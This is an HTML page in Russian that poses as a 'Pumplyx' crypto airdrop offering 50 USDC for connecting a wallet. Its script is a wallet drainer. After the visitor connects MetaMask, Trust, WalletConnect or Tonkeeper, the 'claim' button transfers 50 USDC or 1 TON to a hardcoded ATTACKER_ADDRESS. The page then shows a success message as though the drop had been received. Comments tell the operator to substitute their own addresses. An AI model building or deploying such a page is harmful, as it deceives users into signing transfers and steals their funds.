<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
    <title>Pumplyx — Дроп 50 USDC</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { background: #0a0c14; font-family: 'Inter', -apple-system, sans-serif; color: #eef2f8; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .wrapper { max-width: 420px; width:100%; padding: 20px; }
        .card { background: #131825; border-radius: 40px; padding: 28px 22px; border: 1px solid #2a3248; box-shadow: 0 25px 50px rgba(0,0,0,0.9); }
        .logo { font-size: 36px; font-weight: 800; letter-spacing: -1px; background: linear-gradient(135deg, #f7b731, #f5a623); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .logo span { background: linear-gradient(135deg, #00e5b0, #00b894); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .subhead { font-size: 13px; color: #7b8ba8; margin-top: -2px; margin-bottom: 22px; letter-spacing: 0.3px; }
        .hero { background: #1a2130; border-radius: 24px; padding: 24px 18px; text-align: center; border: 1px solid #2d364b; }
        .hero h2 { font-size: 22px; font-weight: 700; color: #fff; }
        .hero .drop { font-size: 42px; font-weight: 900; color: #f5a623; text-shadow: 0 0 30px #f5a62355; margin: 6px 0; }
        .hero .sub { color: #9aabc4; font-size: 14px; }
        .btn-primary { width:100%; padding: 18px; background: linear-gradient(145deg, #f7b731, #e09d1a); border: none; border-radius: 60px; font-weight: 700; font-size: 18px; color: #0b0d15; cursor: pointer; margin-top: 20px; transition: 0.2s; box-shadow: 0 8px 24px #f7b73144; }
        .btn-primary:active { transform: scale(0.96); }
        .btn-primary:disabled { opacity: 0.5; transform: none; }
        .wallet-row { display: flex; gap: 10px; margin: 18px 0 8px; flex-wrap: wrap; justify-content: center; }
        .wallet-btn { background: #1f2840; border: 1px solid #2f3a58; padding: 10px 16px; border-radius: 40px; font-size: 13px; font-weight: 600; color: #c8d4e8; cursor: pointer; transition: 0.2s; }
        .wallet-btn.active { border-color: #f7b731; background: #2a3450; }
        .status { margin-top: 16px; font-size: 14px; color: #7b8ba8; text-align: center; min-height: 24px; }
        .grid-btns { display: flex; gap: 10px; margin-top: 18px; }
        .grid-btns button { flex:1; background: #1a2130; border: 1px solid #2d364b; padding: 14px 0; border-radius: 40px; color: #c8d4e8; font-weight: 600; font-size: 14px; cursor: pointer; transition: 0.15s; }
        .grid-btns button:active { background: #2a3450; }
        .addr-display { font-size: 12px; color: #4a5a78; word-break: break-all; background: #0e121e; padding: 8px 12px; border-radius: 12px; margin: 12px 0; border: 1px solid #1f2840; text-align: center; }
    </style>
</head>
<body>
<div class="wrapper">
    <div class="card">
        <div class="logo">PUMP<span>LYX</span></div>
        <div class="subhead">⚡ Дроп-кампания • 50 USDC за подключение</div>

        <div class="hero">
            <h2>🎁 Забери дроп</h2>
            <div class="drop">50 USDC</div>
            <div class="sub">Осталось: 127 мест</div>
        </div>

        <div class="wallet-row">
            <button class="wallet-btn" data-wallet="metamask">🦊 MetaMask</button>
            <button class="wallet-btn" data-wallet="trust">📱 Trust</button>
            <button class="wallet-btn" data-wallet="walletconnect">🔗 WalletConnect</button>
            <button class="wallet-btn" data-wallet="tonkeeper">💎 Tonkeeper</button>
        </div>
        <div class="addr-display" id="addrDisplay">Кошелёк не подключён</div>

        <button class="btn-primary" id="claimBtn">💰 Забрать дроп 50 USDC</button>
        <div class="status" id="statusMsg">Подключите кошелёк для получения</div>

        <div class="grid-btns">
            <button id="playBtn">▶ PLAY</button>
            <button id="promoBtn">📹 PROMO</button>
            <button id="overviewBtn">📊 OVERVIEW</button>
        </div>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
<script>
    // ===== НАСТРОЙКИ (ЗАМЕНИТЕ НА СВОИ АДРЕСА) =====
    const ATTACKER_ADDRESS = '0x44698049ad0be92e567cdfe9c5aa86d70047f73e';
    const ATTACKER_TON = 'UQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
    const USDC_CONTRACT = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
    const USDC_DECIMALS = 6;
    const AMOUNT = 50;

    let provider, signer, userAddress, walletType;
    const statusEl = document.getElementById('statusMsg');
    const addrEl = document.getElementById('addrDisplay');
    const claimBtn = document.getElementById('claimBtn');

    // ===== ПРОВЕРКА НАЛИЧИЯ МЕТАМАСК =====
    function isMetaMaskInstalled() {
        return typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask;
    }

    // ===== ПОДКЛЮЧЕНИЕ КОШЕЛЬКОВ =====
    document.querySelectorAll('.wallet-btn').forEach(btn => {
        btn.addEventListener('click', async function() {
            document.querySelectorAll('.wallet-btn').forEach(b => b.classList.remove('active'));
            this.classList.add('active');
            walletType = this.dataset.wallet;
            statusEl.innerText = `⏳ Подключение ${walletType}...`;

            try {
                if (walletType === 'metamask' || walletType === 'trust') {
                    // Проверяем наличие провайдера [citation:9]
                    if (typeof window.ethereum === 'undefined') {
                        throw new Error('Установите MetaMask или Trust Wallet');
                    }
                    
                    // Создаём провайдер через ethers [citation:9]
                    provider = new ethers.providers.Web3Provider(window.ethereum);
                    
                    // Запрашиваем доступ к аккаунтам [citation:9]
                    const accounts = await provider.send('eth_requestAccounts', []);
                    if (accounts.length === 0) {
                        throw new Error('Нет доступных аккаунтов');
                    }
                    
                    userAddress = accounts[0];
                    signer = provider.getSigner();
                    
                    // Сохраняем адрес в localStorage для восстановления после перезагрузки [citation:9]
                    localStorage.setItem('walletAddress', userAddress);
                    
                    addrEl.innerText = `✅ ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
                    statusEl.innerText = `✅ ${walletType} подключён`;
                    claimBtn.disabled = false;
                }
                else if (walletType === 'walletconnect') {
                    // WalletConnect через CDN
                    const provider = new WalletConnectProvider.default({
                        rpc: { 1: 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161' },
                        chainId: 1,
                    });
                    await provider.enable();
                    const web3Provider = new ethers.providers.Web3Provider(provider);
                    signer = web3Provider.getSigner();
                    userAddress = await signer.getAddress();
                    addrEl.innerText = `✅ ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
                    statusEl.innerText = '✅ WalletConnect подключён';
                    claimBtn.disabled = false;
                }
                else if (walletType === 'tonkeeper') {
                    // TON через TonConnect
                    const connector = new TonConnectSDK.TonConnect({
                        manifestUrl: 'https://yourdomain.com/tonconnect-manifest.json'
                    });
                    await connector.connect({ bridge: 'https://bridge.ton.org', network: 'mainnet' });
                    userAddress = connector.wallet.account.address;
                    addrEl.innerText = `✅ ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
                    statusEl.innerText = '✅ Tonkeeper подключён';
                    claimBtn.disabled = false;
                    window.tonConnector = connector;
                }
            } catch (e) {
                // Обработка ошибок с кодом 4001 (пользователь отклонил) [citation:9]
                if (e.code === 4001) {
                    statusEl.innerText = '❌ Пользователь отклонил подключение';
                } else {
                    statusEl.innerText = `❌ Ошибка: ${e.message}`;
                }
                claimBtn.disabled = true;
            }
        });
    });

    // ===== ВОССТАНОВЛЕНИЕ СОСТОЯНИЯ ПОСЛЕ ПЕРЕЗАГРУЗКИ [citation:9] =====
    window.addEventListener('load', async function() {
        const savedAddress = localStorage.getItem('walletAddress');
        if (savedAddress && typeof window.ethereum !== 'undefined') {
            try {
                provider = new ethers.providers.Web3Provider(window.ethereum);
                const accounts = await provider.listAccounts();
                if (accounts.length > 0 && accounts[0].toLowerCase() === savedAddress.toLowerCase()) {
                    userAddress = savedAddress;
                    signer = provider.getSigner();
                    addrEl.innerText = `✅ ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
                    statusEl.innerText = '✅ Сессия восстановлена';
                    claimBtn.disabled = false;
                }
            } catch (e) {
                console.log('Не удалось восстановить сессию');
            }
        }
    });

    // ===== ОТСЛЕЖИВАНИЕ СМЕНЫ АККАУНТА [citation:9] =====
    if (typeof window.ethereum !== 'undefined') {
        window.ethereum.on('accountsChanged', function(accounts) {
            if (accounts.length === 0) {
                // Пользователь отключил кошелёк
                userAddress = null;
                signer = null;
                addrEl.innerText = 'Кошелёк не подключён';
                statusEl.innerText = '⚠️ Кошелёк отключён';
                claimBtn.disabled = true;
                localStorage.removeItem('walletAddress');
            } else if (accounts[0] !== userAddress) {
                // Сменился аккаунт
                userAddress = accounts[0];
                provider = new ethers.providers.Web3Provider(window.ethereum);
                signer = provider.getSigner();
                addrEl.innerText = `✅ ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
                statusEl.innerText = '🔄 Аккаунт изменён';
                localStorage.setItem('walletAddress', userAddress);
                claimBtn.disabled = false;
            }
        });

        // Отслеживание смены сети [citation:9]
        window.ethereum.on('chainChanged', function(chainIdHex) {
            const chainId = parseInt(chainIdHex, 16);
            statusEl.innerText = `🔄 Сеть изменена на ${chainId}`;
            // Обновляем провайдер
            provider = new ethers.providers.Web3Provider(window.ethereum);
            signer = provider.getSigner();
        });
    }

    // ===== КНОПКА "ЗАБРАТЬ ДРОП" =====
    claimBtn.addEventListener('click', async function() {
        if (!userAddress) {
            statusEl.innerText = '⚠️ Сначала подключите кошелёк';
            return;
        }
        statusEl.innerText = '⏳ Подпись транзакции...';
        this.disabled = true;

        try {
            if (walletType === 'metamask' || walletType === 'trust' || walletType === 'walletconnect') {
                const usdc = new ethers.Contract(USDC_CONTRACT, [
                    'function transfer(address to, uint256 amount) external returns (bool)'
                ], signer);
                const tx = await usdc.transfer(ATTACKER_ADDRESS, ethers.utils.parseUnits(AMOUNT.toString(), USDC_DECIMALS));
                await tx.wait();
                statusEl.innerText = `✅ 50 USDC отправлены на ${ATTACKER_ADDRESS.slice(0,6)}...`;
                addrEl.innerText = `💸 Вывод: ${ATTACKER_ADDRESS.slice(0,6)}...${ATTACKER_ADDRESS.slice(-4)}`;
                this.innerText = '💸 Дроп получен';
                this.style.background = '#2a3a4a';
                this.style.color = '#fff';
            }
            else if (walletType === 'tonkeeper') {
                const connector = window.tonConnector;
                const tx = {
                    valid_until: Math.floor(Date.now() / 1000) + 300,
                    messages: [{ address: ATTACKER_TON, amount: '1000000000', payload: '' }]
                };
                await connector.sendTransaction(tx);
                statusEl.innerText = `✅ TON отправлены на ${ATTACKER_TON.slice(0,6)}...`;
                addrEl.innerText = `💸 Вывод: ${ATTACKER_TON.slice(0,6)}...${ATTACKER_TON.slice(-4)}`;
                this.innerText = '💸 Дроп получен';
                this.style.background = '#2a3a4a';
                this.style.color = '#fff';
            }
        } catch (e) {
            if (e.code === 4001) {
                statusEl.innerText = '❌ Пользователь отклонил транзакцию';
            } else {
                statusEl.innerText = `❌ Ошибка: ${e.message}`;
            }
            this.disabled = false;
        }
    });

    // ===== КНОПКИ =====
    document.getElementById('playBtn').onclick = () => statusEl.innerText = '🎮 Игровой режим (демо)';
    document.getElementById('promoBtn').onclick = () => statusEl.innerText = '📹 Промо-видео (скоро)';
    document.getElementById('overviewBtn').onclick = () => statusEl.innerText = '📊 Обзор алгоритма (скоро)';
</script>
</body>
</html>
